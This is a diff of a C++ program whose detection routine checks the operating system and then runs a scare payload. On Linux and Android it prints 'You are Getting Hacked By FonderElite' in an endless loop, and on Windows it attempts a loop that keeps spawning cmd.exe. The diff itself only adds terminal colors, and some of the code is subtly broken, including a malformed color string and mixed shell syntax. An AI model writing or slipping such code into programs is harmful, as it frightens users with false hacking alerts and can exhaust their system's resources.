@@ -46,6 +46,10 @@ else{
 class OS{
     public:
 void detection(){
+        string wi="\033[1;37m"; //white
+        string rd="'\033[0;31m'"; //red
+        string gr="\033[1;32m"; //green 
+        string yl="\033[1;33m"; //yellow
         struct utsname name;
         if(uname(&name)) exit(-1);
         printf("\nYour computer's OS is %s@%s\n", name.sysname, name.release);
@@ -53,12 +57,12 @@ void detection(){
         try{
         if(operating_system == "Linux"){
             system("sleep 2");
-       system("while true; do sleep 0.5; echo  'HIGH ALERT!(You are Getting Hacked By FonderElite.)'; done ");
+       system("while true; do sleep 0.5; echo '\033[1;31m'  'HIGH ALERT!(You are Getting Hacked By FonderElite.)'; done ");
         }else if(operating_system == "Windows"){
         system(":loop; color red; start cmd.exe; echo HACKED BY FONDERELITE!!!; goto loop;");
         }else if(operating_system == "Android"){
             system("sleep 2");
-       system("while true; do sleep 0.5; echo  'HIGH ALERT!(You are Getting Hacked By FonderElite.)'; done ");
+       system("while true; do sleep 0.5; echo '\033[1;31m'  'HIGH ALERT!(You are Getting Hacked By FonderElite.)'; done ");
         }
 
         else{
@@ -94,3 +98,4 @@ convert->file_read(file_name);
 sys->detection();
 return 0;
 }
+    
